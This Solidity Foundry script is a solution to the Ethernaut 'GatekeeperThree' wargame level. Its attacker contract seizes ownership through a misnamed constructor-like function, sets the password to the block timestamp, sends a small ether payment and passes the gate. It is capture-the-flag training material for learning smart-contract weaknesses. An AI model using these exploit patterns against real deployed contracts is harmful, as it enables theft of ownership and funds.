// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "src/levels/GatekeeperThree/GatekeeperThree.sol";
import "forge-std/Script.sol";

contract GatekeeperThreeAttackScript is Script {
    function setUp() public {}

    function run() public {
        GatekeeperThree target = GatekeeperThree(payable(0x0000000000000000000000000000000000000000)); // Insert instance target address

        vm.startBroadcast();
        // Deploy new attacker contract
        GatekeeperThreeAttack attacker = (new GatekeeperThreeAttack){value: 0.0011 ether}(payable(address(target)));

        // Trigger attack
        attacker.attack();

        vm.stopBroadcast();
    }
}

contract GatekeeperThreeAttack {
    GatekeeperThree public gatekeeperThree;

    constructor(address payable _gatekeeperThree) payable {
        gatekeeperThree = GatekeeperThree(_gatekeeperThree);
    }

    function attack() public {
        // Take ownership
        gatekeeperThree.construct0r();
        // Set pasword block.timmestamp
        gatekeeperThree.createTrick();
        // Set allow_entrance = true
        gatekeeperThree.getAllowance(block.timestamp);
        // Enter
        payable(address(gatekeeperThree)).transfer(0.0011 ether);
        gatekeeperThree.enter();
    }
}
